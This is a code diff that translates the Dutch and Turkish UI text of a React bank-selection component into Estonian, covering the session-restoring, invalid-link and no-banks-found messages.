@@ -240,8 +240,8 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
       return (
         <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
           <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8 text-center">
-            <h2 className="text-2xl font-bold text-white mb-2">Bankselectie</h2>
-            <p className="text-sm text-gray-300 mb-8">Sessie wordt hersteld...</p>
+            <h2 className="text-2xl font-bold text-white mb-2">Panga valimine</h2>
+            <p className="text-sm text-gray-300 mb-8">Seanssi taastatakse...</p>
             <div className="flex justify-center py-12">
               <div className="size-10 animate-spin rounded-full border-4 border-[#0066CC]/30 border-t-[#0066CC]" />
             </div>
@@ -252,10 +252,10 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
     return (
       <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
         <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8 text-center">
-          <h2 className="text-2xl font-bold text-white mb-2">Bankselectie</h2>
-          <p className="text-sm text-gray-300 mb-6">Ongeldige link.</p>
+          <h2 className="text-2xl font-bold text-white mb-2">Panga valimine</h2>
+          <p className="text-sm text-gray-300 mb-6">Vigane link.</p>
           <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
-            Gebruik de volledige link om verder te gaan.
+            Jätkamiseks kasuta täielikku linki.
           </p>
         </div>
       </div>
@@ -300,7 +300,7 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
             <div className="grid grid-cols-2 gap-2 sm:gap-1.5 lg:grid-cols-3 pb-1">
               {filteredOptions.length === 0 ? (
                 <div className="col-span-2 lg:col-span-3 rounded-xl border border-white/10 bg-white/5 p-4 text-center text-sm text-gray-200">
-                  Seçili ülke için banka bulunamadı. Lütfen farklı bir ülke seçin veya arama filtresini temizleyin.
+                  Valitud riigi jaoks ei leitud ühtegi panka. Vali teine riik või tühjenda otsingufilter.
                 </div>
               ) : filteredOptions.map((opt, idx) => (
                 <button
